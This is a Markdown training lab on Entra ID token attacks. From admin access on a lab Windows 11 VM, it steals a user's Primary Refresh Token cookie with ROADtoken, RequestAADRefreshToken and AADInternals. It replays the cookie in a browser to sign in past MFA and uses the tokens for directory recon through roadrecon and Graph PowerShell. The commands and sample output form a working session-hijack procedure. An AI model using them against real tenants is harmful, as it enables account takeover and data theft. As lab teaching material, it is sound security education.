# Lab 3 - Token Attacks
### Prepare a victim user with high privileges: 
1. RDP and login to the Win11 VM using the "***YOURUSER@YOURDOMAIN.onmicrosoft.com***" "victim" user that you've created in the previous lab.
2. run ```dsregcmd /status``` and make sure you see ```AzureAdPrt : YES```
    ![prt](prtexists.png)

3. Make sure you are verified:
    1. open Edge and make sure you have your profile logged in
    2. go to Account Info and make sure you don't have any warning about not being verified, if you have then verify yourself.
        ![verifi](verifyAccount.png)
#
# Attacks
From this point on you act as the adversary, without knowing the Entra / AD Creds, you have code execution as Administrator on the Win 11 VM 

#
## 1.Steal-the-PRT-Cookie 
Note: This method will bypass MFA only if the user has authenticated using MFA in its Windows

#### Option 1: steal PRT Cookie using roadrecon tool
Use BrowserCore.exe to request a new PRT cookie with the current existing authentication context:
```powershell
# Get the nonce first
roadrecon auth --prt-init 

# Get a new PRT Cookie
.\ROADtoken.exe <nonce> 
```

#### Option 2: steal PRT Cookie using RequestAADRefreshToken.exe tool
Uses the MicrosoftAccountTokenProvider DLL to request a new PRT cookie.
Download and Run RequestAADRefreshToken.exe from this folder (directly from inside the VM), it will save the output on disk as well as print the tokens to the console.

Note: PRT Cookie can only be used once and its TTL is short
```
Requesting cookies for the following URIs: https://login.microsoftonline.com/
PID  : 37808

Uri: https://login.microsoftonline.com/
    Name      : x-ms-RefreshTokenCredential
    Flags     : 8256
    Data      : <...snip JWT...>; path=/; domain=login.microsoftonline.com; secure; httponly
    P3PHeader : CP="CAO DSP COR ADMa DEV CONo TELo CUR PSA PSD TAI IVDo OUR SAMi BUS DEM NAV STA UNI COM INT PHY ONL FIN PUR LOCi CNT"
```

#### Once PRT Cookie is in your possession:
1. Clear your browser cookies and go to https://myapps.microsoft.com
2. F12 (Chrome dev tools) -> Application -> Cookies
3. Delete ALL cookies and then add one named `x-ms-RefreshTokenCredential` and set its value to the JSON Web Token(JWT) in the `Data` field that RequestAADRefreshToken.exe output
4. Refresh the page (or visit https://myapps.microsoft.com again) and you'll be logged it

# Next Step - Reconnisance

### Recon using AADInternals tool
Use BrowserCore.exe to request a new PRT cookie with the current existing authentication context:
```powershell
Import-Module AADInternals
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken

# if you get "Authorization code not received!" error, then make sure your device is logged in to the user properly(open Edge and sync the profile, go to the windows account settings on Windows and make sure it doesn't need to get verified)
```

### Recon using roadrecon tool
Use BrowserCore.exe to request a new PRT cookie with the current existing authentication context:
```powershell
# Get the nonce first
roadrecon auth --prt-init 

# Get a new PRT Cookie
.\ROADtoken.exe <nonce> 

# using the new PRT Cookie, ask for an access token
roadtx browserprtauth --prt-cookie <cookie> -url

# look at the access token
type .roadtools_auth

roadrecon gather

roadrecon gui

# bonus: authenticate using roadrecon
roadrecon auth --access-token eyJ0eXA... # AT for msgraph is needed
roadrecon auth --prt-cookie <primary-refresh-token> -r msgraph -c "1950a258-227b-4e31-a9cf-717495945fc2"
# bonus 2: search for the client_id here to see to what it has asked At for: https://github.com/dirkjanm/ROADtools/blob/master/roadtx/roadtools/roadtx/firstpartyscopes.json

```

#### Continue your exploration...

You can start with:
```powershell
$prtToken = Get-AADIntUserPRTToken
$at = Get-AADIntAccessTokenForMSGraph -PRTToken $prtToken
$secureAt = ConvertTo-SecureString -String $at -AsPlainText -Force
Connect-MgGraph -AccessToken $secureAt
Get-MgUser

# Or via AAD Graph:
$client_id = "1b730954-1685-4b74-9bfd-dac224a7b894" 
$prtToken = Get-AADIntUserPRTToken
$tenantId = "YOUR_TENANT_ID"
$at = Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
Connect-AzureAD -AadAccessToken $at -TenantId $tenantId -AccountId "1b730954-1685-4b74-9bfd-dac224a7b894" # "Azure Active Directory PowerShell" app id, see here for more https://github.com/dirkjanm/ROADtools/blob/master/roadtx/roadtools/roadtx/firstpartyscopes.json

Get-AzureADUser
```

